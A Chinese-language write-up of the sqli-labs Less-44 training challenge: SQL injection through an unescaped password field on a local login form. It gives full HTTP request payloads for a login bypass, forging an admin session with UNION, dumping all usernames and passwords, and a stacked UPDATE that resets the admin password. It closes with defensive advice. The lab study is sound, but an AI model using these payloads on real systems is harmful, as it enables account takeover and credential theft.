## 题目: Sqli‑labs Less‑44

## 题目描述
登录POST表单，与Less‑42基本一致。`login_user`经过转义，**注入点在login_password密码位**；使用`mysqli_multi_query()`支持堆叠注入；本关卡关闭SQL报错输出，属于报错盲，但是UNION查询结果依旧可以回显。

## 核心原理
```php
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
$password = $_POST["login_password"];
$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
```
关键点：单引号闭合；无报错输出，无法依靠报错判断语法；查询第二列赋值给 session，可以伪造身份。

**解题思路**
1. Burp 抓包修改 password，`' or 1=1 -- -`实现登录绕过
2. Union 伪造 admin 会话
3. Union 脱库获取数据
4. 堆叠 update 修改 admin 密码，依靠登录业务验证执行效果

## 解题步骤
### 1. 登录绕过 Burp 包
```
POST /sqli-labs/Less-44/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=' or 1=1 -- -&mysubmit=Login
```
跳转`logged‑in.php`，登录身份为 Dumb。

### 2. Union 伪造 admin 身份 Burp 包
```
POST /sqli-labs/Less-44/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=' union select 1,'admin',3 -- -&mysubmit=Login
```
Session 用户名变为 admin。

### 3. UNION 脱库 Burp 包
```
POST /sqli-labs/Less-44/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=' union select 1,group_concat(username,0x3a,password),3 from users -- -&mysubmit=Login
```
账号密码回显在`YOU ARE LOGGED IN AS`后。

### 4. 堆叠修改 admin 密码 Burp 包
```
POST /sqli-labs/Less-44/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password='; update users set password='pwned44' where username='admin' -- -&mysubmit=Login
```
页面无任何回显，但是密码已经被修改。

### 5. 密码修改验证 Burp 包
```
POST /sqli-labs/Less-44/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=pwned44&mysubmit=Login
```
使用新密码成功登录 admin 账号。

## 踩坑记录
1. 关闭 SQL 报错，语法错误页面不会提示，依靠登录结果、页面回显判断注入是否生效。
2. 注入点为密码参数，用户名参数已经转义无法注入。
3. `' or 1=1`得到 Dumb，想要 admin 身份必须使用 UNION。
4. users 表为 3 列，UNION 列数必须匹配，报错不会提示列数错误。
5. 堆叠写操作页面空白，不要认为利用失败，使用业务登录进行验证。

## 知识点总结
- Blind 为**报错盲**，不是完全无回显，优先使用 UNION 查询。
- `mysqli_multi_query()`堆叠注入，分号执行多条 SQL，不需要预先登录。
- UNION 控制第二列，伪造 session 登录身份。
- 无报错环境下写操作依靠业务逻辑验证结果。
- 防御：预编译参数绑定；密码输入同样过滤转义；关闭多语句查询；关闭线上数据库报错。
